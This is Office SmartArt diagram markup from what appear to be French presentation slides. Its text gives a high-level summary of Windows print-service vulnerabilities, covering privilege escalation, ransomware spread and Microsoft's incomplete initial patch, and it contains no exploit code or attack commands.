    <dgm:pt modelId="{266C2886-EE02-4156-8BC9-9AAE75436536}" type="parTrans" cxnId="{2B49F574-D9C2-43F7-AF03-D8CD5C25FEA7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{84D61751-4447-4D3A-BF97-07EDA250EA8C}" type="sibTrans" cxnId="{2B49F574-D9C2-43F7-AF03-D8CD5C25FEA7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{10104EB4-F2E3-4DAC-88D8-216C278D0F3C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Contexte :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Failles dans le service d’impression de Windows.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4BE71B76-04B0-4913-9FB5-022786BDA7D4}" type="parTrans" cxnId="{5499D4FA-EE9C-4865-A2B4-B6B093855EE6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{67F1636A-108C-40B8-82D6-FFD19FAD29D6}" type="sibTrans" cxnId="{5499D4FA-EE9C-4865-A2B4-B6B093855EE6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E38E77FE-D621-46B0-B6A3-C60452E50583}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Découverte à priori via une lecture du code leak de Windows.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DB150E9C-3EA6-4E77-94A4-598328F0FE74}" type="parTrans" cxnId="{D6BCE2A1-1BAD-426C-8F55-74F73D2CF4D6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6D77D36E-DC3D-4258-B4AB-92345292D5C2}" type="sibTrans" cxnId="{D6BCE2A1-1BAD-426C-8F55-74F73D2CF4D6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4080B9AD-BC6D-4526-BFF4-CC5AD4925CDA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Permet l’élévation des privilèges jusqu’au niveau administrateur.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{67792A39-08F1-4CF3-9112-3600CA64E053}" type="parTrans" cxnId="{8769BAA0-A009-456B-9C24-56116319023B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1BD03C7C-7142-496E-AD19-19E2CA917C45}" type="sibTrans" cxnId="{8769BAA0-A009-456B-9C24-56116319023B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{42CF5C7A-D7CF-403B-AE14-7FECDAD32B80}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Impact :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exploitable pour propager des ransomwares dans les réseaux.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C3E9BF76-0CDA-42FD-9A41-05C65E6D47BD}" type="parTrans" cxnId="{6A23B206-02B2-490C-87CC-2B145988205A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CA1DCE4A-E3DF-4413-B0D8-4B2F39C0F2A0}" type="sibTrans" cxnId="{6A23B206-02B2-490C-87CC-2B145988205A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" type="pres">
      <dgm:prSet presAssocID="{53BDEEC6-E2E2-4CE5-B803-A4809AE8F83C}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2ECC9A4B-77C2-E940-BCEA-B477E17A3DF3}" type="pres">
      <dgm:prSet presAssocID="{4BEA87B8-5F4A-4D2C-84D4-FE20382350F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36F9769-0A0E-C14F-BD12-3AB925703FAE}" type="pres">
      <dgm:prSet presAssocID="{84D61751-4447-4D3A-BF97-07EDA250EA8C}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8C933FD3-1326-724B-984E-593DBA7E9212}" type="pres">
      <dgm:prSet presAssocID="{10104EB4-F2E3-4DAC-88D8-216C278D0F3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563ED48-FA29-C548-9CD7-147A96E291CC}" type="pres">
      <dgm:prSet presAssocID="{67F1636A-108C-40B8-82D6-FFD19FAD29D6}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{112851AF-E8DD-9F4B-ABE0-F0C20C6D56E6}" type="pres">
      <dgm:prSet presAssocID="{E38E77FE-D621-46B0-B6A3-C60452E5058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A664BC-68C9-4E41-81C0-08072A47687E}" type="pres">
      <dgm:prSet presAssocID="{E38E77FE-D621-46B0-B6A3-C60452E50583}" presName="childText" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F6FB0716-6877-CB4E-AD8F-893235CFA94F}" type="pres">
      <dgm:prSet presAssocID="{42CF5C7A-D7CF-403B-AE14-7FECDAD32B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9079901-522C-F345-A45E-BC892701F8ED}" type="presOf" srcId="{53BDEEC6-E2E2-4CE5-B803-A4809AE8F83C}" destId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2CE57606-018C-0749-9969-7766B1E6484B}" type="presOf" srcId="{10104EB4-F2E3-4DAC-88D8-216C278D0F3C}" destId="{8C933FD3-1326-724B-984E-593DBA7E9212}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6A23B206-02B2-490C-87CC-2B145988205A}" srcId="{53BDEEC6-E2E2-4CE5-B803-A4809AE8F83C}" destId="{42CF5C7A-D7CF-403B-AE14-7FECDAD32B80}" srcOrd="3" destOrd="0" parTransId="{C3E9BF76-0CDA-42FD-9A41-05C65E6D47BD}" sibTransId="{CA1DCE4A-E3DF-4413-B0D8-4B2F39C0F2A0}"/>
    <dgm:cxn modelId="{9523EB48-C4F5-2242-BA28-4B8D7808684E}" type="presOf" srcId="{E38E77FE-D621-46B0-B6A3-C60452E50583}" destId="{112851AF-E8DD-9F4B-ABE0-F0C20C6D56E6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C12CA857-9BA5-C247-9A88-E85F6CB7D96D}" type="presOf" srcId="{42CF5C7A-D7CF-403B-AE14-7FECDAD32B80}" destId="{F6FB0716-6877-CB4E-AD8F-893235CFA94F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2B49F574-D9C2-43F7-AF03-D8CD5C25FEA7}" srcId="{53BDEEC6-E2E2-4CE5-B803-A4809AE8F83C}" destId="{4BEA87B8-5F4A-4D2C-84D4-FE20382350FF}" srcOrd="0" destOrd="0" parTransId="{266C2886-EE02-4156-8BC9-9AAE75436536}" sibTransId="{84D61751-4447-4D3A-BF97-07EDA250EA8C}"/>
    <dgm:cxn modelId="{8769BAA0-A009-456B-9C24-56116319023B}" srcId="{E38E77FE-D621-46B0-B6A3-C60452E50583}" destId="{4080B9AD-BC6D-4526-BFF4-CC5AD4925CDA}" srcOrd="0" destOrd="0" parTransId="{67792A39-08F1-4CF3-9112-3600CA64E053}" sibTransId="{1BD03C7C-7142-496E-AD19-19E2CA917C45}"/>
    <dgm:cxn modelId="{D6BCE2A1-1BAD-426C-8F55-74F73D2CF4D6}" srcId="{53BDEEC6-E2E2-4CE5-B803-A4809AE8F83C}" destId="{E38E77FE-D621-46B0-B6A3-C60452E50583}" srcOrd="2" destOrd="0" parTransId="{DB150E9C-3EA6-4E77-94A4-598328F0FE74}" sibTransId="{6D77D36E-DC3D-4258-B4AB-92345292D5C2}"/>
    <dgm:cxn modelId="{826C1BE1-2770-504B-A24E-AE9274A0E152}" type="presOf" srcId="{4080B9AD-BC6D-4526-BFF4-CC5AD4925CDA}" destId="{8CA664BC-68C9-4E41-81C0-08072A47687E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{71FC6DF8-D0FF-3D47-B719-A608E20ACE99}" type="presOf" srcId="{4BEA87B8-5F4A-4D2C-84D4-FE20382350FF}" destId="{2ECC9A4B-77C2-E940-BCEA-B477E17A3DF3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5499D4FA-EE9C-4865-A2B4-B6B093855EE6}" srcId="{53BDEEC6-E2E2-4CE5-B803-A4809AE8F83C}" destId="{10104EB4-F2E3-4DAC-88D8-216C278D0F3C}" srcOrd="1" destOrd="0" parTransId="{4BE71B76-04B0-4913-9FB5-022786BDA7D4}" sibTransId="{67F1636A-108C-40B8-82D6-FFD19FAD29D6}"/>
    <dgm:cxn modelId="{F6A02A4C-0D95-874D-A846-5D2768180E12}" type="presParOf" srcId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" destId="{2ECC9A4B-77C2-E940-BCEA-B477E17A3DF3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{29408FDE-2CB4-B248-9256-8576E555C5D5}" type="presParOf" srcId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" destId="{D36F9769-0A0E-C14F-BD12-3AB925703FAE}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{A38CCA06-A943-2E4C-A76B-58A2A81F8B94}" type="presParOf" srcId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" destId="{8C933FD3-1326-724B-984E-593DBA7E9212}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{B429E58A-FD63-2645-8EE4-861DFE7ECA16}" type="presParOf" srcId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" destId="{7563ED48-FA29-C548-9CD7-147A96E291CC}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2ACED300-47D0-9942-95F2-C0FE470C8E61}" type="presParOf" srcId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" destId="{112851AF-E8DD-9F4B-ABE0-F0C20C6D56E6}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{BE26525C-5731-B641-8DD3-1A43D6D7B764}" type="presParOf" srcId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" destId="{8CA664BC-68C9-4E41-81C0-08072A47687E}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{3E3A3448-31F8-4F41-90A5-E6D0577DE2AF}" type="presParOf" srcId="{A3EF3884-ADAD-2440-ADBB-CD4451EE8F81}" destId="{F6FB0716-6877-CB4E-AD8F-893235CFA94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887C1E1-270C-449A-812C-A0539CC9F63B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9707BB6-94BD-4971-BC26-AFF353EF2E0A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Origines multiples :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DB56EB70-10C9-4A5A-9787-A4710E0BA527}" type="parTrans" cxnId="{923E1736-DF1E-4884-BAA1-B7D0B32A97DB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8EE5FBDD-8A49-4C78-BB19-B078FC707F94}" type="sibTrans" cxnId="{923E1736-DF1E-4884-BAA1-B7D0B32A97DB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1ACA130E-28D3-472D-B7BE-15DCBBBBBD58}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Une série de failles combinées dans le service d’impression.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{94A8D436-8873-4F62-BBA9-F2A60680762B}" type="parTrans" cxnId="{7E0AD459-D043-438C-97E6-0B372EC79454}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{643609B1-D900-45AA-9EA0-017698DB1264}" type="sibTrans" cxnId="{7E0AD459-D043-438C-97E6-0B372EC79454}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Problèmes de correctifs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FD59D940-3735-4C8C-9DA8-13FBE394C94E}" type="parTrans" cxnId="{DB177C8A-73A6-4CA3-9240-DC1C871CAB67}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6F913C98-1F7D-46A5-B4F7-A196A6FCF645}" type="sibTrans" cxnId="{DB177C8A-73A6-4CA3-9240-DC1C871CAB67}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{46471CA6-6232-4CD9-8FB8-29CBBB44BD84}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Microsoft a initialement publié un correctif incomplet, prolongeant la vulnérabilité.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FDE3CE52-1FD8-4D03-9245-3C952FAC7463}" type="parTrans" cxnId="{016524E9-015C-4F50-817E-5789F6D9B0FB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{19E9514D-9CFF-4691-ADB3-64CC2179AA07}" type="sibTrans" cxnId="{016524E9-015C-4F50-817E-5789F6D9B0FB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" type="pres">
      <dgm:prSet presAssocID="{C887C1E1-270C-449A-812C-A0539CC9F63B}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A495B27B-DDB2-DB43-A1F7-54DF62CF3A55}" type="pres">
      <dgm:prSet presAssocID="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3E7153A3-B81F-3444-A4DA-5F438E9C0D1A}" type="pres">
      <dgm:prSet presAssocID="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{51EEE134-9386-924F-813E-349E94A4A9FB}" type="pres">
      <dgm:prSet presAssocID="{C9707BB6-94BD-4971-BC26-AFF353EF2E0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822FE68-B36D-1C49-B312-AB740A38934A}" type="pres">
      <dgm:prSet presAssocID="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2B2922AC-21A0-2945-B264-E38ED33A0FF2}" type="pres">
      <dgm:prSet presAssocID="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BBC1498E-ED13-1D46-9F4E-C0236B49709C}" type="pres">
      <dgm:prSet presAssocID="{8EE5FBDD-8A49-4C78-BB19-B078FC707F94}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4AF94AFF-7667-BF42-932F-AECB9449F514}" type="pres">
      <dgm:prSet presAssocID="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5EEB04F3-42D2-2D4E-A840-DB41170F1041}" type="pres">
      <dgm:prSet presAssocID="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{28B4A214-5E9E-2142-9F14-DB1B5FE3F873}" type="pres">
      <dgm:prSet presAssocID="{E7EAF2AE-DD6A-47AC-88CF-C425346E558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6AD9490-B97F-5343-BAA8-E2F3698BF03E}" type="pres">
      <dgm:prSet presAssocID="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EA8FC166-9B44-DC47-8653-FB0DB926AFFF}" type="pres">
      <dgm:prSet presAssocID="{E7EAF2AE-DD6A-47AC-88CF-C425346E558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2E30B2D-1952-1E40-8F65-96965361EF76}" type="presOf" srcId="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" destId="{3E7153A3-B81F-3444-A4DA-5F438E9C0D1A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{923E1736-DF1E-4884-BAA1-B7D0B32A97DB}" srcId="{C887C1E1-270C-449A-812C-A0539CC9F63B}" destId="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" srcOrd="0" destOrd="0" parTransId="{DB56EB70-10C9-4A5A-9787-A4710E0BA527}" sibTransId="{8EE5FBDD-8A49-4C78-BB19-B078FC707F94}"/>
    <dgm:cxn modelId="{7E0AD459-D043-438C-97E6-0B372EC79454}" srcId="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" destId="{1ACA130E-28D3-472D-B7BE-15DCBBBBBD58}" srcOrd="0" destOrd="0" parTransId="{94A8D436-8873-4F62-BBA9-F2A60680762B}" sibTransId="{643609B1-D900-45AA-9EA0-017698DB1264}"/>
    <dgm:cxn modelId="{DB177C8A-73A6-4CA3-9240-DC1C871CAB67}" srcId="{C887C1E1-270C-449A-812C-A0539CC9F63B}" destId="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}" srcOrd="1" destOrd="0" parTransId="{FD59D940-3735-4C8C-9DA8-13FBE394C94E}" sibTransId="{6F913C98-1F7D-46A5-B4F7-A196A6FCF645}"/>
    <dgm:cxn modelId="{2F2E668D-601C-5844-B3C8-7A1C479BEB5F}" type="presOf" srcId="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}" destId="{28B4A214-5E9E-2142-9F14-DB1B5FE3F873}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2622F896-2A82-7143-B669-D44CE5BCD2C4}" type="presOf" srcId="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}" destId="{5EEB04F3-42D2-2D4E-A840-DB41170F1041}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9D1764A3-61D9-C94A-B503-BE8ED322B1A0}" type="presOf" srcId="{1ACA130E-28D3-472D-B7BE-15DCBBBBBD58}" destId="{2B2922AC-21A0-2945-B264-E38ED33A0FF2}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9B741FBB-5E75-C643-9646-EF4B46274740}" type="presOf" srcId="{C887C1E1-270C-449A-812C-A0539CC9F63B}" destId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{29D434D6-DD6A-A440-87DF-650B480874F5}" type="presOf" srcId="{46471CA6-6232-4CD9-8FB8-29CBBB44BD84}" destId="{EA8FC166-9B44-DC47-8653-FB0DB926AFFF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{112327E0-E2B8-524C-BADA-C7E356B04C35}" type="presOf" srcId="{C9707BB6-94BD-4971-BC26-AFF353EF2E0A}" destId="{51EEE134-9386-924F-813E-349E94A4A9FB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{016524E9-015C-4F50-817E-5789F6D9B0FB}" srcId="{E7EAF2AE-DD6A-47AC-88CF-C425346E5585}" destId="{46471CA6-6232-4CD9-8FB8-29CBBB44BD84}" srcOrd="0" destOrd="0" parTransId="{FDE3CE52-1FD8-4D03-9245-3C952FAC7463}" sibTransId="{19E9514D-9CFF-4691-ADB3-64CC2179AA07}"/>
    <dgm:cxn modelId="{23A56015-72D8-7C44-BD62-52C192849386}" type="presParOf" srcId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" destId="{A495B27B-DDB2-DB43-A1F7-54DF62CF3A55}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6C4BF17A-6816-3B41-810E-B5027CC93D9A}" type="presParOf" srcId="{A495B27B-DDB2-DB43-A1F7-54DF62CF3A55}" destId="{3E7153A3-B81F-3444-A4DA-5F438E9C0D1A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7D9FEFD8-EC11-FF43-8E6F-2014517F4E1A}" type="presParOf" srcId="{A495B27B-DDB2-DB43-A1F7-54DF62CF3A55}" destId="{51EEE134-9386-924F-813E-349E94A4A9FB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1D331D39-E51D-E044-B7A0-022677F7BAAD}" type="presParOf" srcId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" destId="{8822FE68-B36D-1C49-B312-AB740A38934A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{39B8C983-1B6B-1C46-A665-5A89495F6C4F}" type="presParOf" srcId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" destId="{2B2922AC-21A0-2945-B264-E38ED33A0FF2}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CF3F9214-062E-0048-9870-3E2B514EB094}" type="presParOf" srcId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" destId="{BBC1498E-ED13-1D46-9F4E-C0236B49709C}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F7AD4F6A-9DB2-3F4B-8FD4-11710C3E5017}" type="presParOf" srcId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" destId="{4AF94AFF-7667-BF42-932F-AECB9449F514}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4F5FDAB4-E4D9-9945-B3EF-5862980A4940}" type="presParOf" srcId="{4AF94AFF-7667-BF42-932F-AECB9449F514}" destId="{5EEB04F3-42D2-2D4E-A840-DB41170F1041}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9399800E-541A-9446-A796-E06D8F1125F9}" type="presParOf" srcId="{4AF94AFF-7667-BF42-932F-AECB9449F514}" destId="{28B4A214-5E9E-2142-9F14-DB1B5FE3F873}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{93E1C37E-CCAE-9142-B3F1-5C9005E1C1F7}" type="presParOf" srcId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" destId="{86AD9490-B97F-5343-BAA8-E2F3698BF03E}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
